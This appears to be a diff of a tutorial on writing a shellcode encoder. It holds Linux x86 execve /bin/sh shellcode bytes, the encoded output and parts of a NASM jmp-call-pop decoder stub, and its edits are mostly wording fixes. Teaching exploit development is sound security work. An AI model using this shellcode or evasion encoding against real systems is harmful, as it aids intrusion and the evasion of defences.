@@ -166,7 +166,7 @@ For our encoder, let's keep things relatively simple. Our encoding process will 
 
 ### Step 1 -- Bit Shift
 
-In order to mark which bytes we are shifting we will append a `0xff` to them so that later when we decode, we know which ones were shifted. 
+In order to mark which bytes we are shifting we will prepend a `0xff` to them so that later when we decode, we know which ones were shifted. 
 
 ```python
 byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
@@ -191,7 +191,7 @@ root@kali:~# python3 encoder.py
 \xff\x62\xc0\xff\xa0\xff\xd0\xff\x5e\xff\x5e\xff\xe6\xff\xd0\xff\xd0\xff\x5e\xff\xc4\xff\xd2\xff\xdc\x89\xe3\xff\xa0\x89\xe2\xff\xa6\x89\xe1\xb0\xff\x16\xcd\x80
 ```
 
-Looks like we ended up with 14 of the bytes shifted. That's pretty cool!
+Looks like we ended up with 15 of the bytes shifted. That's pretty cool!
 
 ### Step 2 -- Random Byte Injection
 
@@ -285,7 +285,8 @@ call_decoder:
 ```
 
 Let's break this down:
-+ the first thing we do with `jmp short call_decoder` is direct control flow to our `call_decoder` function. This function's first instruction is `call decoder`, what this does is store the `shellcode: db` content on the top of the stack and then direct control flow to the `decoder` function. 
+
+The first thing we do with `jmp short call_decoder` is direct control flow to our `call_decoder` function. This function's first instruction is `call decoder`, what this does is store the `shellcode: db` content on the top of the stack and then direct control flow to the `decoder` function. 
 
 ```nasm
 decoder:
@@ -295,7 +296,7 @@ decoder:
 	xor ebx, ebx
 ```
 
-All we're doing is popping the `shellcode: db` off of the top of the stack and into `esi` so `esi` has our shell-code now. We are going to use `edi` to keep track of our decoded shell-code so we `lea` it with the memory location of `esi`. Then we just clear registers.
+All we're doing is popping the `shellcode: db` off of the top of the stack and into `$esi` so `$esi` has our shell-code now. We are going to use `$edi` to keep track of our decoded shell-code so we `lea` it with the memory location of `$esi`. Then we just clear registers.
 
 Let's observe that our first byte in our payload is `0xff` which we know from our encoder means that the byte after it has been switched one place to the right. Let's examine the `sniffer` function to see how it handles this. 
 
